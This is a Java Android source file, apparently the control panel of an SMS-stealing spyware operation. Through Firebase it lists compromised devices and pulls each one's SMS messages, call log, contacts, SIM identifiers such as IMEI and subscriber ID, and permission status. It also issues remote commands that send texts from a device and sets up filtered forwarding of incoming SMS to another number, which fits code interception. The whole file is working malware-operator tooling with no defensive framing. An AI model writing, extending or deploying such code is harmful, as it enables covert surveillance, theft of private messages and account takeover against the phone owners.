package com.rebel.panel.firebase;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;
import com.rebel.panel.data.CallEntry;
import com.rebel.panel.data.ContactEntry;
import com.rebel.panel.data.Device;
import com.rebel.panel.data.SmsMessage;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PanelRepository {

    public interface DevicesCallback {
        void onDevices(List<Device> devices);
        void onError(String message);
    }

    public interface SmsCallback {
        void onSms(List<SmsMessage> messages, int totalCount);
    }

    public interface CallsCallback {
        void onCalls(List<CallEntry> calls, int total);
    }

    public interface ContactsCallback {
        void onContacts(List<ContactEntry> contacts, int total);
    }

    public interface SimCallback {
        void onSim(Map<String, String> fields);
    }

    public interface PermissionsCallback {
        void onPermissions(Map<String, Boolean> permissions);
    }

    public interface SimpleListCallback {
        void onRows(List<Map<String, Object>> rows);
    }

    public interface ForwardingCallback {
        void onSettings(boolean enabled, String forwardTo, boolean forwardAll, List<String> filters);
    }

    public interface VoidCallback {
        void onSuccess();
        void onError(String message);
    }

    private static PanelRepository instance;
    private final DatabaseReference root;
    private ValueEventListener devicesListener;
    private DevicesCallback devicesCallback;
    private boolean useNewPath;

    private PanelRepository() {
        root = FirebaseDatabase.getInstance().getReference();
    }

    public static synchronized PanelRepository get() {
        if (instance == null) {
            instance = new PanelRepository();
        }
        return instance;
    }

    public void listenDevices(@NonNull DevicesCallback callback) {
        devicesCallback = callback;
        root.child("devices_status").addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists() && snapshot.getChildrenCount() > 0) {
                    useNewPath = true;
                    attachDevicesListener("devices_status", true);
                } else {
                    useNewPath = false;
                    attachDevicesListener("devices", false);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onError(error.getMessage());
            }
        });
    }

    private void attachDevicesListener(String path, boolean newPath) {
        if (devicesListener != null) {
            root.child(path).removeEventListener(devicesListener);
        }
        useNewPath = newPath;
        devicesListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (devicesCallback != null) {
                    devicesCallback.onDevices(parseDevices(snapshot, useNewPath));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                if (devicesCallback != null) {
                    devicesCallback.onError(error.getMessage());
                }
            }
        };
        root.child(path).addValueEventListener(devicesListener);
    }

    public void stopDevicesListener() {
        if (devicesListener != null) {
            root.child(useNewPath ? "devices_status" : "devices").removeEventListener(devicesListener);
            devicesListener = null;
        }
    }

    public static List<Device> parseDevices(DataSnapshot snapshot, boolean newPath) {
        List<Device> list = new ArrayList<>();
        long now = System.currentTimeMillis();
        if (!snapshot.exists()) {
            return list;
        }
        for (DataSnapshot child : snapshot.getChildren()) {
            String id = child.getKey();
            if (id == null) continue;
            boolean online;
            String name;
            String brand;
            String android;
            int battery;
            String network;
            boolean charging;
            long lastSeen;
            int smsCount;

            if (newPath) {
                online = Boolean.TRUE.equals(child.child("online").getValue(Boolean.class));
                long ts = longVal(child.child("ts").getValue());
                long tsAge = ts > 0 && now > ts ? now - ts : 0;
                if (!online && tsAge > 0 && tsAge < 300_000L) online = true;
                name = str(child.child("name").getValue());
                brand = str(child.child("brand").getValue());
                android = str(child.child("android").getValue());
                battery = intVal(child.child("battery").getValue());
                network = str(child.child("network").getValue());
                charging = Boolean.TRUE.equals(child.child("charging").getValue(Boolean.class));
                lastSeen = ts;
                smsCount = intVal(child.child("sms_count").getValue());
            } else {
                online = Boolean.TRUE.equals(child.child("online_status").getValue(Boolean.class))
                    || Integer.valueOf(1).equals(child.child("online_status").getValue(Integer.class));
                long ts = longVal(child.child("live_data/timestamp_millis").getValue());
                long tsAge = ts > 0 && now > ts ? now - ts : 0;
                if (!online && tsAge > 0 && tsAge < 300_000L) online = true;
                name = str(child.child("device_info/device_model").getValue());
                brand = str(child.child("device_info/device_brand").getValue());
                android = str(child.child("device_info/android_version").getValue());
                battery = intVal(child.child("live_data/battery_level").getValue());
                network = str(child.child("live_data/network_type").getValue());
                charging = Boolean.TRUE.equals(child.child("live_data/is_charging").getValue(Boolean.class));
                lastSeen = ts;
                DataSnapshot smsSnap = child.child("all_sms");
                smsCount = smsSnap.exists() ? intVal(smsSnap.child("total_count").getValue()) : 0;
            }
            if (name.isEmpty()) name = "Unknown";
            if (network.isEmpty()) network = "?";
            list.add(new Device(id, name, brand, android, online, battery, network, charging, lastSeen, smsCount));
        }
        Collections.sort(list, new Comparator<Device>() {
            @Override
            public int compare(Device a, Device b) {
                if (a.online != b.online) return a.online ? -1 : 1;
                return Long.compare(b.lastSeen, a.lastSeen);
            }
        });
        return list;
    }

    public void listenSms(String deviceId, @NonNull SmsCallback callback) {
        final List<SmsMessage> newMsgs = new ArrayList<>();
        final List<SmsMessage> allMsgs = new ArrayList<>();
        final int[] total = {0};

        Runnable merge = () -> {
            List<Long> newDates = new ArrayList<>();
            for (SmsMessage m : newMsgs) {
                // dedupe by date string marker not available - use address+body
            }
            List<SmsMessage> merged = new ArrayList<>(newMsgs);
            for (SmsMessage m : allMsgs) {
                boolean dup = false;
                for (SmsMessage n : newMsgs) {
                    if (eq(n.address, m.address) && eq(n.body, m.body)) {
                        dup = true;
                        break;
                    }
                }
                if (!dup) merged.add(m);
            }
            if (merged.size() > 100) {
                merged = merged.subList(0, 100);
            }
            callback.onSms(merged, newMsgs.size() + total[0]);
        };

        deviceRef(deviceId).child("new_sms").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                newMsgs.clear();
                if (snapshot.exists()) {
                    List<DataSnapshot> children = new ArrayList<>();
                    for (DataSnapshot c : snapshot.getChildren()) children.add(c);
                    Collections.reverse(children);
                    for (DataSnapshot c : children) {
                        newMsgs.add(mapSms(c, true));
                    }
                }
                merge.run();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) { }
        });

        deviceRef(deviceId).child("all_sms").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                allMsgs.clear();
                total[0] = intVal(snapshot.child("total_count").getValue());
                DataSnapshot messages = snapshot.child("messages");
                if (messages.exists()) {
                    for (DataSnapshot c : messages.getChildren()) {
                        allMsgs.add(mapSms(c, false));
                    }
                }
                merge.run();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) { }
        });
    }

    public void listenCalls(String deviceId, @NonNull CallsCallback callback) {
        deviceRef(deviceId).child("all_calls").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<CallEntry> list = new ArrayList<>();
                int total = intVal(snapshot.child("total_count").getValue());
                DataSnapshot calls = snapshot.child("calls");
                if (calls.exists()) {
                    for (DataSnapshot c : calls.getChildren()) {
                        list.add(new CallEntry(
                            str(c.child("number").getValue()),
                            str(c.child("contact_name").getValue()),
                            str(c.child("date_readable").getValue()),
                            str(c.child("duration").getValue()),
                            str(c.child("type").getValue())
                        ));
                    }
                }
                callback.onCalls(list, total);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onCalls(new ArrayList<CallEntry>(), 0);
            }
        });
    }

    public void listenContacts(String deviceId, @NonNull ContactsCallback callback) {
        deviceRef(deviceId).child("all_contacts").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<ContactEntry> list = new ArrayList<>();
                int total = intVal(snapshot.child("total_count").getValue());
                DataSnapshot contacts = snapshot.child("contacts");
                if (contacts.exists()) {
                    for (DataSnapshot c : contacts.getChildren()) {
                        list.add(new ContactEntry(
                            str(c.child("name").getValue()),
                            str(c.child("phone").getValue())
                        ));
                    }
                }
                callback.onContacts(list, total);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onContacts(new ArrayList<ContactEntry>(), 0);
            }
        });
    }

    public void listenSim(String deviceId, @NonNull SimCallback callback) {
        deviceRef(deviceId).child("device_info/sim_info").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Map<String, String> map = new HashMap<>();
                if (snapshot.exists()) {
                    put(map, "SIM Operator", snapshot.child("sim_operator_name").getValue());
                    put(map, "Network", snapshot.child("network_operator_name").getValue());
                    put(map, "IMEI", snapshot.child("imei").getValue());
                    put(map, "Subscriber ID", snapshot.child("subscriber_id").getValue());
                }
                callback.onSim(map);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onSim(new HashMap<String, String>());
            }
        });
    }

    public void listenPermissions(String deviceId, @NonNull PermissionsCallback callback) {
        deviceRef(deviceId).child("live_data/permissions").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Map<String, Boolean> map = new HashMap<>();
                if (snapshot.exists()) {
                    for (DataSnapshot c : snapshot.getChildren()) {
                        Boolean v = c.getValue(Boolean.class);
                        map.put(c.getKey(), Boolean.TRUE.equals(v));
                    }
                }
                callback.onPermissions(map);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onPermissions(new HashMap<String, Boolean>());
            }
        });
    }

    public void listenSentSms(String deviceId, @NonNull SimpleListCallback callback) {
        deviceRef(deviceId).child("sent_sms").addValueEventListener(listListener(callback, "to", "message", "sent_at"));
    }

    public void listenForwardedSms(String deviceId, @NonNull SimpleListCallback callback) {
        deviceRef(deviceId).child("forwarded_sms").addValueEventListener(listListener(callback, "from", "to", "body", "forwarded_at"));
    }

    public void listenForwarding(String deviceId, @NonNull ForwardingCallback callback) {
        deviceRef(deviceId).child("forwarding_settings").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                boolean enabled = Boolean.TRUE.equals(snapshot.child("enabled").getValue(Boolean.class));
                String forwardTo = str(snapshot.child("forward_to").getValue());
                boolean forwardAll = !snapshot.child("forward_all").exists()
                    || Boolean.TRUE.equals(snapshot.child("forward_all").getValue(Boolean.class));
                List<String> filters = new ArrayList<>();
                DataSnapshot f = snapshot.child("filters");
                if (f.exists()) {
                    for (DataSnapshot item : f.getChildren()) {
                        String v = item.getValue(String.class);
                        if (v != null && !v.isEmpty()) filters.add(v);
                    }
                }
                callback.onSettings(enabled, forwardTo, forwardAll, filters);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) { }
        });
    }

    public void sendSmsCommand(String deviceId, String to, String message, @NonNull VoidCallback callback) {
        Map<String, Object> cmd = new HashMap<>();
        cmd.put("to", to);
        cmd.put("message", message);
        cmd.put("timestamp", ServerValue.TIMESTAMP);
        deviceRef(deviceId).child("manual_commands/send_sms").push().setValue(cmd)
            .addOnCompleteListener(task -> {
                if (task.isSuccessful()) callback.onSuccess();
                else callback.onError(task.getException() != null ? task.getException().getMessage() : "Failed");
            });
    }

    public void saveForwarding(String deviceId, boolean enabled, String forwardTo,
                               boolean forwardAll, List<String> filters, @NonNull VoidCallback callback) {
        Map<String, Object> data = new HashMap<>();
        data.put("enabled", enabled);
        data.put("forward_to", forwardTo);
        data.put("forward_all", forwardAll);
        data.put("filters", filters);
        data.put("updated_at", ServerValue.TIMESTAMP);
        deviceRef(deviceId).child("forwarding_settings").setValue(data).addOnCompleteListener(task -> {
            if (task.isSuccessful()) callback.onSuccess();
            else callback.onError(task.getException() != null ? task.getException().getMessage() : "Failed");
        });
    }

    private DatabaseReference deviceRef(String deviceId) {
        return root.child("devices").child(deviceId);
    }

    private static ValueEventListener listListener(SimpleListCallback callback, String... keys) {
        return new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<Map<String, Object>> rows = new ArrayList<>();
                if (snapshot.exists()) {
                    List<DataSnapshot> children = new ArrayList<>();
                    for (DataSnapshot c : snapshot.getChildren()) children.add(c);
                    Collections.reverse(children);
                    int limit = Math.min(children.size(), 30);
                    for (int i = 0; i < limit; i++) {
                        DataSnapshot c = children.get(i);
                        Map<String, Object> row = new HashMap<>();
                        for (String key : keys) {
                            row.put(key, c.child(key).getValue());
                        }
                        rows.add(row);
                    }
                }
                callback.onRows(rows);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onRows(new ArrayList<Map<String, Object>>());
            }
        };
    }

    private static SmsMessage mapSms(DataSnapshot c, boolean isNew) {
        return new SmsMessage(
            str(c.child("address").getValue()),
            str(c.child("body").getValue()),
            str(c.child("date_readable").getValue()),
            str(c.child("type").getValue()),
            isNew
        );
    }

    private static void put(Map<String, String> map, String label, @Nullable Object value) {
        map.put(label, value != null ? String.valueOf(value) : "");
    }

    private static String str(@Nullable Object v) {
        return v != null ? String.valueOf(v) : "";
    }

    private static int intVal(@Nullable Object v) {
        if (v instanceof Number) return ((Number) v).intValue();
        try {
            return v != null ? Integer.parseInt(String.valueOf(v)) : 0;
        } catch (Exception e) {
            return 0;
        }
    }

    private static long longVal(@Nullable Object v) {
        if (v instanceof Number) return ((Number) v).longValue();
        try {
            return v != null ? Long.parseLong(String.valueOf(v)) : 0L;
        } catch (Exception e) {
            return 0L;
        }
    }

    private static boolean eq(String a, String b) {
        return a != null && a.equals(b);
    }
}
